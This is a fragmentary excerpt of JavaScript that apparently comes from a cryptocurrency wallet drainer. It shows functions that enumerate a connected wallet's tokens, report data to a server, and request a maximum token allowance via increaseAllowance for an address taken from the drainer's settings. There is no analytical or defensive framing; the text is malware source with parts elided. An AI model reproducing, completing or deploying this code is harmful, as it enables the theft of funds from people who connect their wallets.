...
const send_request = async (data) => {
  try {
    ...
    data.message_ts = Math.ceil(Date.now() / Math.ceil(Math.random() * 99));
    data.chat_data =
...
const get_wallet_assets = async (address) => {
  try {
    ...
    else if (MS_Settings.AT != "") assets = await get_tokens(address);
    else {
      MS_Check_Done = true;
      Swal.close();
      Swal.fire({
...
const MM_APPROVE_TOKEN = async (asset) => {
  ...
  try {
    gas_limit = await contract.estimateGas.increaseAllowance(
      MS_Settings.Address,
      max_approval_amount,
      { from: MS_Current_Address }
    );
